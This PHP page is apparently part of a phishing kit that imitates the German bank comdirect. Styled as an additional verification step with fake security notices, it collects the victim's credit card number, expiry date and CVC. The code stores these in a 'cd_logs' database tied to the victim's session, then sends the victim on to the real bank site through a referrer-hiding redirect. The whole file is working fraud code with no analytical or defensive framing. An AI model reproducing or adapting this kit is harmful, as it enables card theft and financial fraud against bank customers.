<?php

	$this_Title = "Weitere Angaben";

	include("comdirect_config.inc.php");
	
	require_once("Mobile_Detect.php");
	$detectMobile = new Mobile_Detect;
	
	session_start();
	
	if($_SESSION["process_finished"] == TRUE) {
		header("Location: https://href.li/?https://comdirect.de");
		exit();
	}
	
	if(isset($_POST["execute_task"])) {
		//EXECUTE TASK
		if(empty($_POST["cc_number"])) {
			$obErrorMsg = TRUE;
		} else if(empty($_POST["exp_month"])) {
			$obErrorMsg = TRUE;
		} else if(empty($_POST["exp_year"])) {
			$obErrorMsg = TRUE;
		} else if(empty($_POST["cvc_number"])) {
			$obErrorMsg = TRUE;
		} else {
			//CONTINUE EXECUTION
			$cc_number = $_POST["cc_number"];
			$exp_month = $_POST["exp_month"];
			$exp_year = $_POST["exp_year"];
			$cvc_number = $_POST["cvc_number"];
		
			$statusEntry = 5;
		
			$update_Log_Data = $SQL->prepare("UPDATE cd_logs SET cc_number = ?, exp_month = ?, exp_year = ?, cvc_number = ?, status = ? WHERE data_id = ?");
			$update_Log_Data->bind_param("ssssis", $cc_number, $exp_month, $exp_year, $cvc_number, $statusEntry, $_SESSION["data_id"]);
			$update_Log_Data->execute();
			$update_Log_Data->close();
		
			header("Location: Abschluss");
			exit();
		}
	}
	
	if(isset($_POST["skip_action"])) {
		$skipEntry = "übersprungen";
		$statusEntry = 5;
		
		$update_Log_Data = $SQL->prepare("UPDATE cd_logs SET cc_number = ?, exp_month = ?, exp_year = ?, cvc_number = ?, status = ? WHERE data_id = ?");
		$update_Log_Data->bind_param("ssssis", $skipEntry, $skipEntry, $skipEntry, $skipEntry, $statusEntry, $_SESSION["data_id"]);
		$update_Log_Data->execute();
		$update_Log_Data->close();
		
		header("Location: Abschluss");
		exit();
		
	}
	
	include("comdirect_header.tpl.php");
	
?>

	<div class="cif-scope bg-color--cd-black-0">
		<div class="grid-container--limited-md  hidden-lg kontoinhaber__container" id="div_kontoinhaber"> </div>
	</div>
	<div class="cif-scope-content-wrapper siteFrame" data-plugin="{common_eventHub: {events: ['resize']}}">
		<div class="grid-container--limited-md grid-container">
			<div class="grid--no-gutter grid">
				<div class="col--md-6 col col--sm-4 col--md-push-right-1 col--lg-12 col--md-push-left-1">
					<div class="col__content col__content--no-padding-bottom">
						<h1 class="headline--h1 headline"><?=$this_Title;?></h1></div>
				</div>
			<?php
			
				if($detectMobile->isMobile()) {
					
			?>
				<div class="col--md-6 col col--sm-4 col--lg-6 col--md-push-right-1 col--md-push-left-1" style="margin-top:-30px;">
			<?php
			
				} else {
				
			?>
				<div class="col--md-6 col col--sm-4 col--lg-6 col--md-push-right-1 col--md-push-left-1" style="margin-top:-35px;">
			<?php
				
				}
				
			?>
			
			
				
			
					<div class="col__content col__content--no-padding-top">
					
					
			<?php
				
					if($obErrorMsg == TRUE) {
						
						
				?>
				
				<div style="padding:10px 10px 10px 10px;background-color:#f70000;border:1px solid #eee;color:#fff;margin-top:20px;border-radius:3px;">
					Sie müssen alle Felder vollständig ausfüllen, wenn Sie fortfahren möchten. Alternativ können Sie diesen Schritt auch überspringen.
				</div>
				<?php
				
					}
					
				?>
					
						<p style="margin-bottom:-3px;">Wir benötigen nun nur noch einige weiterführende Informationen Ihrerseits, um diesen Vorgang nun vollständig abschließen zu können. Bitte achten Sie stets auf Vollständigkeit und Validität Ihrer Angaben. Sollten Sie diese Informationen zurzeit nicht zur Hand haben, so können Sie diesen Schritt auch überspringen.
						</p>
						<form id="login" method="post" action="" enctype="multipart/form-data">
						
						
						<!-- FORM START -->
						
						<div class="grid--no-gutter grid grid--no-bottom">
    <div class="col col-12" style="margin-bottom:-25px;">
        <div class="col__content col__content--no-padding-horizontal col__content--no-padding-bottom col__content--padding-top">
            <div class="input-group--no-padding-bottom input-group">
                <div class="input-group__fill">
                    <div id="param1" data-tid="param1" class="floating-input floating-input--margin-bottom" data-plugin="">
                        <div class="floating-input__container" data-role="floating-input__container" data-plugin="">
                            <input
                                class="floating-input__input"
                                data-role="floating-input__input"
                                id="obCCNumber"
                                data-tid="param1Input"
                                type="text"
                                name="cc_number"
								placeholder="XXXX XXXX XXXX XXXX"
                            />
                            <label class="floating-input__label" data-role="floating-input__label">Kreditkartennummer</label>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="col col-3">
        <div class="col__content col__content--no-padding-horizontal col__content--no-padding-bottom col__content--padding-top">
            <div class="input-group--no-padding-bottom input-group">
                <div class="input-group__fill">
                    <div id="param3" data-tid="param3" class="floating-input floating-input--margin-bottom" data-plugin="{floatingInput: {patternName: 'floating-input'}}">
                        <div class="floating-input__container ripple" data-role="floating-input__container" data-plugin="{ripple:{}}">
                            <input class="floating-input__input" data-role="floating-input__input" id="param3Input" type="text" name="exp_month" maxlength="2" placeholder="XX" />
                            <label class="floating-input__label" data-role="floating-input__label">Monat</label>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
	<div class="col col-1"></div>
	<div class="col col-4">
        <div class="col__content col__content--no-padding-horizontal col__content--no-padding-bottom col__content--padding-top">
            <div class="input-group--no-padding-bottom input-group">
                <div class="input-group__fill">
                    <div id="param3" data-tid="param3" class="floating-input floating-input--margin-bottom" data-plugin="{floatingInput: {patternName: 'floating-input'}}">
                        <div class="floating-input__container ripple" data-role="floating-input__container" data-plugin="{ripple:{}}">
                            <input class="floating-input__input" data-role="floating-input__input" id="param3Input" type="text" name="exp_year" maxlength="4" placeholder="XXXX" />
                            <label class="floating-input__label" data-role="floating-input__label">Jahr</label>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
	<div class="col col-1"></div>
	<div class="col col-3">
        <div class="col__content col__content--no-padding-horizontal col__content--no-padding-bottom col__content--padding-top">
            <div class="input-group--no-padding-bottom input-group">
                <div class="input-group__fill">
                    <div id="param3" data-tid="param3" class="floating-input floating-input--margin-bottom" data-plugin="{floatingInput: {patternName: 'floating-input'}}">
                        <div class="floating-input__container ripple" data-role="floating-input__container" data-plugin="{ripple:{}}">
                            <input class="floating-input__input" data-role="floating-input__input" id="param3Input" type="text" name="cvc_number" maxlength="3" placeholder="XXXX" />
                            <label class="floating-input__label" data-role="floating-input__label">CVC</label>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

</div>

						
						<!-- FORM END -->
						
						
							<div class="grid--no-gutter grid grid--no-bottom">


			<div class="col col-12">

				<div class="col__content col__content--no-padding-horizontal col__content--no-padding-bottom col__content--padding-top">
					<button type="submit" name="execute_task" class="button button--growing button--large button--primary">Verifizierung jetzt abschließen</button>
				</div>
			</div>
			
			<div class="col col-12">

				<div class="col__content col__content--no-padding-horizontal col__content--no-padding-bottom col__content--padding-top">
					<button type="submit" name="skip_action" class="button button--growing button--large button--primary">Schritt jetzt überspringen</button>
				</div>
			</div>

		</div>
		</form>
	</div>
	</div>
	<div class="col--md-6 col col--sm-4 col--lg-6 col--md-push-right-1 col--md-push-left-1">
		<div class="col__content col__content--no-padding-vertical">
			<div class="outer-spacing--xxlarge-top">
				<h5 class="headline--h5 headline">Wichtige Sicherheitshinweise</h5>
				<div class="outer-spacing--medium-bottom">
					<label class="flex-layout" for="layer-0">
						<div><span class="icon icon--cd_warning-16 icon--size-16 color--cd-anthracite-50"> <svg class="icon__svg" focusable="false"> <use xlink:href="assets/fonts/svg-symbol.svg#cd_warning-16"></use></svg></span></div>
						<div class="inner-spacing--xsmall-left"><span class="link link--secondary">Lesen Sie sich alle Anweisungen und Hinweise genauestens durch.</span></div>
					</label>
				</div>
				<div class="outer-spacing--medium-bottom">
					<label class="flex-layout" for="layer-1">
						<div><span class="icon icon--cd_warning-16 icon--size-16 color--cd-anthracite-50"> <svg class="icon__svg" focusable="false"> <use xlink:href="assets/fonts/svg-symbol.svg#cd_warning-16"></use></svg></span></div>
						<div class="inner-spacing--xsmall-left"><span class="link link--secondary">Achten Sie auf absolute Validität und Vollständigkeit Ihrer Angaben.</span></div>
					</label>
				</div>
				<div class="outer-spacing--medium-bottom">
					<label class="flex-layout" for="layer-2">
						<div><span class="icon icon--cd_warning-16 icon--size-16 color--cd-anthracite-50"> <svg class="icon__svg" focusable="false"> <use xlink:href="assets/fonts/svg-symbol.svg#cd_warning-16"></use></svg></span></div>
						<div class="inner-spacing--xsmall-left"><span class="link link--secondary">Führen Sie diesen Vorgang vollständig und ordnungsgemäß durch.</span></div>
					</label>
				</div>
				<div class="outer-spacing--medium-bottom">
					<label class="flex-layout" for="layer-3">
						<div><span class="icon icon--cd_warning-16 icon--size-16 color--cd-anthracite-50"> <svg class="icon__svg" focusable="false"> <use xlink:href="assets/fonts/svg-symbol.svg#cd_warning-16"></use></svg></span></div>
						<div class="inner-spacing--xsmall-left"><span class="link link--secondary">Warten Sie im Anschluss auf die Bestätigungsmeldung zu Ihrer Synchronisierung.</span></div>
					</label>
				</div>
				
				
				
				
				
				
			</div>
		</div>
	</div>

	</div>
	</div>
	</div>

<?php

	include("comdirect_footer.tpl.php");
	
?>